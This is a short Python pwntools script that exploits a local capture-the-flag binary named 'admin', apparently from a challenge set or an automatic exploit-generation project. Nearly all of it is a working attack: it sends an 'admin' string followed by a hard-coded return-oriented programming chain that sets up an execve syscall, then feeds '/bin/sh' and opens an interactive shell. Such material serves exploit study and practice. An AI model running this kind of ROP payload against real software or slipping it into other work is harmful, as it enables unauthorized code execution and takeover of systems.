from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/2-admin/admin")
pwn.gdb.attach(p)
payload = b""
payload += b'admin\x00\x01 \x80\x00\x80\x00 \x80\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x04@\x00\x00\x00\x00\x00DUA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\x06@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x93\x01A\x00\x00\x00\x00\x00\xe0\xb2k\x00\x00\x00\x00\x00\xc6\xbcD\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x15MG\x00\x00\x00\x00\x00DUA\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x86\x06@\x00\x00\x00\x00\x00\xe0\xb2k\x00\x00\x00\x00\x00\x93\x01A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc6\xbcD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15MG\x00\x00\x00\x00\x00\n'
p.send(payload)
payload = b""
payload += b'/bin/sh\x00'
p.send(payload)
p.interactive()
